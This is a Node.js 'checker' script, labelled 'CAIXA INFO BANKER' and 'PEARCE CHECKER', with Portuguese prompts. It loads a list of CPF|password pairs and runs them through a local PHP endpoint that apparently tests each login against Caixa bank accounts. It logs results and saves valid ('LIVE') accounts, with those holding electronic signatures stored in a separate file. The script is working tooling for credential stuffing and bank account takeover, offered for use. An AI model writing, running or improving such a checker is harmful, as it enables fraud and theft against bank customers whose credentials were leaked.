 //require
utf8 = require("utf8"),
eol = require("os").EOL,
fs = require("fs")
const figlet = require("figlet");
const request = require("request")
var rn = require('random-number');
const chalk = require("chalk");
const { v4: uuidv4 } = require('uuid');
var colors = require('colors');
const UserAgent = require("user-agents");
const prompt = require('prompt-sync')();
const signale = require('signale');
require('events').EventEmitter.prototype._maxListeners = 100;
//function request
function __curl($options) {
    return new Promise((resolve, reject) => {
        request($options, (err, res, body) => {
            resolve({ err: err, res: res, body: body })
        })
    })
}

//function
function getstr(index, index2, index3, value) {
    try {
        return {
            success: true,
            message: index.split(index2)[value].split(index3)[0]
        };
    } catch (e) {
        return {
            success: false
        };
    }
}
//(function 2)
function makeid() {
  var text = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (var i = 0; i < 22; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));

  return text;
}
//function
function code_challenge() {
  var text = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (var i = 0; i < 50; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));

  return text;
}
//(random cor)
Array.prototype.random = function (length) {
  return this[Math.floor((Math.random()*length))];
}
//(cor)
var color = ['white']
var rcolor = color.random(color.length)
//Requisição inicial
const listas = prompt('NOME DA LISTA: '[rcolor]);
//const threads = prompt('Escolha Quantos threads: '[rcolor]);
const senha_assinatura = prompt('[1] P/ VERIFICAR OS 6 PRIMEIROS DIGITOS DA SENHA | [2] P/ VERIFICAR OS 4 PRIMEIROS E OS 2 ULTIMOS DA DIGITOS SENHA: '[rcolor]);
const adc_19 = prompt('[1] P/ ADICIONAR O 19 EM LISTA DE 6 DIGITOS | [2] P/ CONTINUAR SEM ADICIONAR O 19: '[rcolor]);
//(tela inicial)
figlet("CAIXA INFO BANKER", {
    font: "Standard"
}, function(err, data) {
    console.log()
    console.log(chalk.whiteBright(data))
    //console.log("+ " + `INFORMAÇÕES!`[rcolor]);
    //console.log("+ " + `Threads ${threads} !`[rcolor]);
    console.log("+ " + `TOTAL CARREGADAS: ${lista.length}`)
    console.log()
    console.log()
    console.log(chalk.redBright("#PEARCE CHECKER - TESTADOR INICIADO!\n"[rcolor]));

    for (var x = 0 ;x< 6 ;x++) {
   
        init()
    }

});
//(LISTA)
const lista = fs.readFileSync(`${listas}.txt`, "utf8").split(eol)
//Lista count
var CountLives = 0;
var countAp2 = 0;
var CountDies = 0;
var counterror = 0;
var Countlines = lista.length
var CountFila = Countlines
var CountErros = 0
var modExec
var count = 0;
var cpfs = new Array();
//init
async function init(linha = false) {
//funtion
  try {
//funtion userAgent
let userAgent = new UserAgent({ deviceCategory: 'mobile' })
//(LISTA CPF)
var [cpf, senha] =(linha) ? linha :  lista.shift().split("|");
//(remove letras)
var senha = `${senha}`.split("").filter(n => (Number(n) || n == 0)).join("");
//(senha)
if (!senha || senha == undefined || senha == null || senha.length < 6 || senha.length > 8) {
//(couter + console)
CountDies++
CountFila = CountFila-1
console.log(chalk.italic(`[${CountDies}/${Countlines}] ${cpf}|${senha} » "SENHA MENOR QUE 6 DIGITOS OU MAIOR QUE 8 DIGITOS!" [RESTAM: ${CountFila}]`))
//(return)
return
}
//(senha)
if (!cpf || cpf == undefined || cpf == null || cpf.length < 11 || cpf.length > 11) {
  //(couter + console)
CountDies++
CountFila = CountFila-1
console.log(chalk.italic(`[${CountDies}/${Countlines}] ${cpf}|${senha} » "CPF INVALIDO!" [RESTAM: ${CountFila}]`))
//(return)
return
}
//(encrypt senha md5)
for (;;) {
var caixa = await __curl({
url: `http://localhost/chk_caixa/caixa.php?linha=${cpf}|${senha}|${senha_assinatura}|${adc_19}`,
method: "GET", 
//timeout: 3000,
followAllRedirects: true,
headers: {
}
});

if (caixa.body) break;
}
//( Errror Sessao)
if (!caixa.body){
//(couter + console)
CountErros++
CountFila = CountFila-1
console.log(chalk.italic(`[${CountDies}/${Countlines}] ${cpf}|${senha} » "NENHUM RETORNO OBTIDO!" [RESTAM: ${CountFila}]`))
//(return)
return
//(else LIVE)
} else if (caixa.body.includes('LIVE')) {
  //console Live
  CountLives++
  CountFila = CountFila-1
  console.log(chalk.green(`[${CountDies}/${Countlines}] ${caixa.body} [RESTAM: ${CountFila}]`))
  fs.appendFileSync("Aprovadas/caixa_ativa.txt", `${caixa.body} \n`)

  if (caixa.body.includes('ASSINATURA ELETRONICA')) {
  //console Live
  fs.appendFileSync("Aprovadas/caixa_assinatura_ativa.txt", `${caixa.body} \n`)
  return
//(Else)
}

  return
}

 else {
//(couter + console)
CountDies++
CountFila = CountFila-1
console.log(chalk.italic(`[${CountDies}/${Countlines}] ${caixa.body} [RESTAM: ${CountFila}]`))
//(return)
return
}
//error
  }catch (error) {
    //(error)
  console.log(`${error} `[rcolor]);
    //(finaliza)
 }finally{
  //finally
if (lista.length !== 0) init() 

//(finalizado)
}

}



